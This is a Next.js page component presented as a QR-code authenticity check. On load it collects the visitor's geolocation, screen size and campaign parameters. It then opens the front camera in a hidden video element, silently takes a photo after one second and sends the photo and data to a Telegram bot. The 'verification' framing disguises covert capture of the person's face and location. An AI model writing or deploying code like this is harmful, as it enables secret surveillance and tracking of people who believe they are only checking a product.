"use client";

import { useEffect, useState, useRef, useCallback } from 'react';
import { useSearchParams } from 'next/navigation';
import { notifyVisit, sendTelegramPhoto } from '@/utils/telegramApi';
import { useLayoutContext } from '@/context/LayoutContext';
import { showSuccess, showError } from '@/utils/toast';
import LoadingSpinner from '@/components/LoadingSpinner'; // Assuming you have a LoadingSpinner component

type QrVerifyPageProps = {
  params: { lang: string };
};

const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
  const searchParams = useSearchParams();
  const { t } = useLayoutContext();
  const currentLang = params.lang;

  const [statusMessage, setStatusMessage] = useState<string>(t.authenticity.processingRequest);
  const [error, setError] = useState<string | null>(null);
  const [photoSent, setPhotoSent] = useState<boolean>(false);
  const [stream, setStream] = useState<MediaStream | null>(null);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const captureAndSendPhoto = useCallback(async (captionMessage: string, currentLat: number | null, currentLon: number | null) => {
    if (!videoRef.current || !canvasRef.current) {
      setError("Video or canvas element not found.");
      return;
    }

    const video = videoRef.current;
    const canvas = canvasRef.current;
    const context = canvas.getContext('2d');

    if (!context) {
      setError("Could not get 2D context from canvas.");
      return;
    }

    // Set canvas dimensions to match video
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw video frame to canvas
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Get image data as base64
    const photoBase64 = canvas.toDataURL('image/png');

    try {
      await sendTelegramPhoto({ photoBase64, caption: captionMessage });
      showSuccess(t.authenticity.qrScanSuccess);
      setPhotoSent(true);
      setStatusMessage(t.authenticity.qrScanSuccess);
    } catch (photoError: unknown) {
      console.error("Failed to send QR photo to Telegram:", photoError);
      showError(t.authenticity.qrScanError);
      setError(photoError instanceof Error ? photoError.message : "Failed to send photo.");
      setStatusMessage(t.authenticity.qrScanError);
    }
  }, [t]);

  useEffect(() => {
    let mediaStream: MediaStream | null = null;
    let geoLat: number | null = null;
    let geoLon: number | null = null;

    const setupCameraAndSend = async () => {
      try {
        // 1. Get Geolocation
        setStatusMessage(t.authenticity.processingRequest);
        if (navigator.geolocation) {
          try {
            const position = await new Promise<GeolocationPosition>((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: false });
            });
            geoLat = position.coords.latitude;
            geoLon = position.coords.longitude;
          } catch (geoError) {
            console.warn("Geolocation permission denied or error:", geoError);
            // Not critical, continue without precise location
          }
        }

        // 2. Request Camera Access (prioritize 'user' (front) camera, fallback to 'environment' (rear))
        setStatusMessage("Requesting camera access...");
        try {
          mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }); // Try front camera first
        } catch (frontCameraError: unknown) {
          console.warn("Front camera not available or permission denied, trying rear camera:", frontCameraError);
          try {
            mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }); // Fallback to rear camera
          } catch (rearCameraError: unknown) {
            throw rearCameraError; // If both fail, re-throw the last error
          }
        }
        
        setStream(mediaStream);

        if (videoRef.current) {
          videoRef.current.srcObject = mediaStream;
          await videoRef.current.play(); // Start playing the video
        }

        // 3. Send initial visit notification to get caption
        const utmQueryParams = {
          utm_source: searchParams?.get('utm_source') || null,
          utm_medium: searchParams?.get('utm_medium') || null,
          utm_campaign: searchParams?.get('utm_campaign') || null,
        };
        const bodyData = {
          lat: geoLat,
          lon: geoLon,
          screenWidth: window.innerWidth,
          screenHeight: window.innerHeight,
          isQrScan: true, // Explicitly mark as QR scan
        };
        const captionMessage = await notifyVisit(bodyData, utmQueryParams);

        // 4. Capture and send photo after a short delay to allow camera to stabilize
        setStatusMessage("Taking photo...");
        setTimeout(() => {
          captureAndSendPhoto(captionMessage, geoLat, geoLon);
        }, 1000); // 1 second delay after video starts playing

      } catch (err: unknown) {
        console.error("Error during QR verification process:", err);
        if (err instanceof DOMException && err.name === "NotAllowedError") {
          setError(t.authenticity.qrScanError + " (Camera access denied).");
          setStatusMessage(t.authenticity.qrScanError + " (Camera access denied).");
          showError(t.authenticity.qrScanError + " (Camera access denied).");
        } else if (err instanceof DOMException && err.name === "NotFoundError") {
          setError(t.authenticity.qrScanError + " (No camera found).");
          setStatusMessage(t.authenticity.qrScanError + " (No camera found).");
          showError(t.authenticity.qrScanError + " (No camera found).");
        } else {
          setError(t.authenticity.qrScanError + (err instanceof Error ? `: ${err.message}` : "."));
          setStatusMessage(t.authenticity.qrScanError);
          showError(t.authenticity.qrScanError);
        }
      }
    };

    setupCameraAndSend();

    // Cleanup function
    return () => {
      if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
      }
    };
  }, [currentLang, searchParams, t, captureAndSendPhoto]);

  return (
    <div className="flex flex-col items-center justify-center min-h-screen p-4 text-center bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-gray-50">
      <h1 className="text-3xl font-bold mb-6">{t.authenticity.title}</h1>
      
      {!photoSent && !error && (
        <div className="mb-4">
          <LoadingSpinner />
        </div>
      )}

      <p className="text-lg mb-4">{statusMessage}</p>
      
      {error && (
        <p className="text-red-600 dark:text-red-400 text-base mb-4">{error}</p>
      )}

      {photoSent && (
        <p className="text-primary-600 dark:text-primary-400 text-xl font-semibold">
          {t.authenticity.qrScanSuccess}
        </p>
      )}

      {/* Hidden video and canvas elements for camera interaction */}
      <video ref={videoRef} autoPlay playsInline muted className="hidden" />
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
};

export default QrVerifyPage;